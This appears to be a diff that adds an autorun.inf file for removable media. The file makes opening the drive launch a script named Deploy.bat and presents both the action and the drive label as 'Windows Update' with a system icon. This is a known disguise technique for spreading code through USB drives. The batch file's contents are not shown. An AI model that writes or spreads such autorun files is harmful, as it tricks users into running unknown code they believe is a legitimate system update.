@@ -1,0 +1,5 @@
+[autorun]
+open=Deploy.bat
+action=Windows Update
+label=Windows Update
+icon=%SystemRoot%\system32\shell32.dll,27
